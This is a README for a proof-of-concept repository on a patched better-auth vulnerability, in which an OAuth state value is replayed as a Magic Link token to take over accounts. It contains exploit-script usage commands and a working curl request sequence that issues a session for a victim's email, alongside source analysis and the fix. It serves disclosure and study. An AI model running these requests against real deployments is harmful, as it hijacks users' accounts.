# better-auth GHSA-965c-763c-88jm

[![Advisory](https://img.shields.io/badge/GHSA-965c--763c--88jm-red)](https://github.com/better-auth/better-auth/security/advisories/GHSA-965c-763c-88jm)
[![Affected](https://img.shields.io/badge/affected-%3E%3D1.4.0--beta.18%20%3C1.7.7-orange)](https://github.com/better-auth/better-auth/security/advisories/GHSA-965c-763c-88jm)
[![Patched](https://img.shields.io/badge/patched-1.7.7-green)](https://github.com/better-auth/better-auth/pull/11494)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)

PoC and source-level analysis for **OAuth state / Magic Link token confusion** in [better-auth](https://github.com/better-auth/better-auth): an attacker who knows a victim email can take over the account without inbox access and without completing any OAuth grant.

**中文说明：** [README.md](./README.md)

| | |
| --- | --- |
| Advisory | [GHSA-965c-763c-88jm](https://github.com/better-auth/better-auth/security/advisories/GHSA-965c-763c-88jm) |
| Component | better-auth (npm) |
| Affected | `>= 1.4.0-beta.18`, `< 1.7.7` |
| Analyzed | 1.7.6 |
| Patched | 1.7.7 ([PR #11494](https://github.com/better-auth/better-auth/pull/11494), purpose isolation) |
| CWE | CWE-287 Improper Authentication |

## Disclaimer

This repository is for **authorized security testing and education only**. Do not run the script against systems you do not own or do not have explicit permission to test. The vulnerability is public and patched; upgrade to better-auth **1.7.7 or later**.

## Trigger conditions

All of the following must hold:

1. Magic Link plugin is enabled (`storeToken` defaults to `"plain"`; or `"hashed"` with `verification.storeIdentifier: "hashed"`).
2. At least one social login or Generic OAuth provider is enabled.
3. OAuth state is stored in the database (the default when a database or `secondaryStorage` is configured). Cookie-backed state is not affected.

## Quick start

Python 3.8+, standard library only. No `pip install`.

```bash
python3 betterauth_poc.py -t http://127.0.0.1:8080 -e victim@example.com -p github
```

Cookie mode (prints a `Set-Cookie` value you can paste into a browser):

```bash
python3 betterauth_poc.py -t https://sso.example.com --cookie -e victim@example.com -p google
```

```
python3 betterauth_poc.py -t <base-url> [options]
```

| Flag | Default | Meaning |
| --- | --- | --- |
| `-t` / `--target` | (required) | Target origin, e.g. `http://10.0.0.1:8080` |
| `-e` / `--email` | `victim@example.com` | Account email to take over |
| `-p` / `--provider` | `github` | Enabled OAuth provider id (`github` / `google`, or a generic-oauth `providerId`) |
| `--base-path` | `/api/auth` | better-auth API base path |
| `--name` | `poc` | Placeholder `name` inside `additionalData` |
| `--cookie` | off | Follow 302 and print `better-auth.session_token`; default is JSON session credentials |
| `--callback` | `/app` | Redirect target in cookie mode |
| `-k` / `--insecure` | off | Skip TLS certificate verification |
| `--timeout` | `15` | Request timeout in seconds |

Further examples: custom `--base-path /auth`, self-signed TLS (`-k`), generic OAuth (`-p my-sso`). See `python3 betterauth_poc.py -h`.

**Exit codes:** `0` success (JSON: `user.email` matches `-e`; cookie: `better-auth.session_token` present) · `1` session issued but email mismatch · `2` request failed.

| Symptom | Likely cause |
| --- | --- |
| HTTP 429 | Rate limit; wait and retry |
| `PROVIDER_NOT_FOUND` | `-p` does not match the app config; generic-oauth uses a custom `providerId` |
| No `state` in the authorize URL | Not better-auth, or wrong `--base-path` |
| `INVALID_TOKEN` | Magic Link disabled; state expired (10 minutes) or already consumed; target is 1.7.7+ |
| Cookie mode has no session | Custom `cookiePrefix`; use default JSON mode and read `token` |

## Minimal request sequence

```bash
# 1. Start OAuth sign-in and inject the victim email into additionalData
curl -s -X POST http://target/api/auth/sign-in/social \
  -H 'Content-Type: application/json' \
  -d '{"provider":"<provider>","callbackURL":"/","disableRedirect":true,
       "additionalData":{"email":"victim@example.com","name":"x"}}'
# → {"url":"https://...?...&state=<STATE>...","redirect":false}

# 2. Submit state as a Magic Link token
#    Without callbackURL: JSON {token, user, session}
curl -s 'http://target/api/auth/magic-link/verify?token=<STATE>' \
  -H 'Origin: http://target'

#    With callbackURL: 302 + Set-Cookie
curl -i 'http://target/api/auth/magic-link/verify?token=<STATE>&callbackURL=/app' \
  -H 'Origin: http://target'
```

The global origin middleware allows GET. Endpoint-level origin checks only validate redirect URLs such as `callbackURL`; relative paths are trusted by default.

## Root cause

better-auth stored two different one-time credentials in the same `verification` table, both keyed by a random string `identifier`:

| Record | identifier | value |
| --- | --- | --- |
| Magic Link token | `token` | `JSON({email, name})` |
| OAuth state | `state` | `JSON({…additionalData, callbackURL, codeVerifier, link, oauthState…})` |

`consumeVerificationValue` looks up by `identifier` only. It does not check purpose. OAuth state rows can therefore be consumed as Magic Link tokens.

`POST /sign-in/social` lets the caller inject arbitrary keys into the state JSON via `additionalData` (including `email`). Magic Link verify then destructures `email` from that JSON and issues a session for that user.

```
POST /sign-in/social
  └─ additionalData: { email: victim }
       └─ generateState()            oauth2/state.ts
            └─ generateGenericState()
                 └─ createVerificationValue({
                      identifier: <random-state>,
                      value: JSON({ email, …oauth fields })
                    })
       └─ { url: "...&state=<random-state>" }

GET /magic-link/verify?token=<random-state>
  └─ storeToken() default "plain"
       └─ consumeVerificationValue(identifier)   no purpose check
            └─ JSON.parse(value).email
                 └─ findUserByEmail / createUser
                      └─ createSession + setSessionCookie
```

If the email does not exist and Magic Link allows sign-up, a new user is created with a verified email.

## Source chain (better-auth v1.7.6)

Paths are relative to `packages/better-auth/src/`.

### 1. OAuth sign-in writes state plus the injected email

**Entry: `api/routes/sign-in.ts:197` — `signInSocial` (`POST /sign-in/social`)**

```ts
// api/routes/sign-in.ts:192
additionalData: z.record(z.string(), z.any()).optional().meta({
    description: "Additional data to be passed through the OAuth flow",
}),
```

```ts
// api/routes/sign-in.ts:376-379
const { codeVerifier, state } = await generateState(c, {
    additionalData: c.body.additionalData,
    idTokenNonce,
});
```

**`oauth2/state.ts:39` — `generateState` spreads `additionalData` onto the top-level state object**

```ts
// oauth2/state.ts:56-69
const stateData: StateData = {
    ...(options?.additionalData ? options.additionalData : {}),   // email/name injected here
    callbackURL,
    codeVerifier,
    errorURL: c.body?.errorCallbackURL,
    newUserURL: c.body?.newUserCallbackURL,
    link: options?.link,
    serverContext,
    expiresAt: Date.now() + 10 * 60 * 1000,
    requestSignUp: c.body?.requestSignUp,
    idTokenNonce: options?.idTokenNonce,
};
```

These keys overwrite injected values and cannot be used to rewrite protocol fields: `callbackURL`, `codeVerifier`, `errorURL`, `link`, `serverContext`, `expiresAt`, `requestSignUp`, `idTokenNonce`. `email` and `name` are not in that list.

**`state.ts:82` — `generateGenericState` stores the row with `identifier = state`**

```ts
const state = generateRandomString(32);   // state.ts:87

// state.ts:137-144 (database strategy; default with a DB / secondary storage)
const verification = await c.context.internalAdapter.createVerificationValue({
    value: JSON.stringify({
        ...stateData,          // includes injected email
        oauthState: state,
    } satisfies StateData),
    identifier: state,         // same namespace as Magic Link tokens
    expiresAt,
});
```

The handler returns the authorize URL containing `state`. No IdP interaction is required. The row expires in 10 minutes and is single-use.

```ts
// api/routes/sign-in.ts:394-397
return c.json({
    url: url.toString(),
    redirect: !c.body.disableRedirect,
});
```

### 2. Submit state as a Magic Link token

**Entry: `plugins/magic-link/index.ts:298` — `magicLinkVerify` (`GET /magic-link/verify`)**

```ts
// plugins/magic-link/index.ts:386-390
const storedToken = await storeToken(ctx, token);      // default "plain" (line 163)
const tokenValue =
    await ctx.context.internalAdapter.consumeVerificationValue(
        storedToken,
    );
if (!tokenValue) {
    redirectWithError("INVALID_TOKEN");
}
```

**`db/internal-adapter.ts:1390` — lookup by identifier only**

```ts
consumeVerificationValue: async (
    identifier: string,
): Promise<Verification | null> => {

// database branch, internal-adapter.ts:1452
const where = [{ field: "identifier", value: id }];
```

With secondaryStorage only, consume uses `getAndDelete`, still keyed solely by identifier.

### 3. Issue a session for the injected email

```ts
// plugins/magic-link/index.ts:394-397
const { email, name } = JSON.parse(tokenValue.value) as {
    email: string;
    name?: string | undefined;
};

let user = await ctx.context.internalAdapter
    .findUserByEmail(email)
    .then((res) => res?.user);

const session = await ctx.context.internalAdapter.createSession(user.id);

await setSessionCookie(ctx, { session, user });

if (!ctx.query.callbackURL) {
    return ctx.json({
        token: session.token,
        user: parseUserOutput(ctx.context.options, user),
        session: parseSessionOutput(ctx.context.options, session),
    });
}
```

## Fix (v1.7.7)

```bash
git diff v1.7.6 v1.7.7 -- \
  packages/better-auth/src/plugins/magic-link/index.ts \
  packages/better-auth/src/state.ts
```

1. **Identifier namespaces.** Magic Link records use `magic-link:${storedToken}`; OAuth state uses `auth-state:${state}` (`getAuthStateVerificationIdentifier`).
2. **Payload schema.** Verify pre-checks the record shape with `findVerificationValue` and refuses to consume a foreign row. After atomic consume, `value` must match `{type: "magic-link", email, name?}` (`.strict()` + `z.email()`).
3. **Purpose-derived keys.** `crypto/purpose.ts` `derivePurposeKey` (HKDF-SHA256) isolates cookie-strategy state encryption and OAuth proxy payloads.

Pre-upgrade Magic Link and OAuth state rows will not verify. Custom `verification.storeIdentifier.overrides` must account for the `magic-link:` and `auth-state:` prefixes.

## References

- Advisory: https://github.com/better-auth/better-auth/security/advisories/GHSA-965c-763c-88jm
- Fix PR: https://github.com/better-auth/better-auth/pull/11494
- Purpose-key implementation: `packages/better-auth/src/crypto/purpose.ts` (v1.7.7)

## License

[MIT](LICENSE)
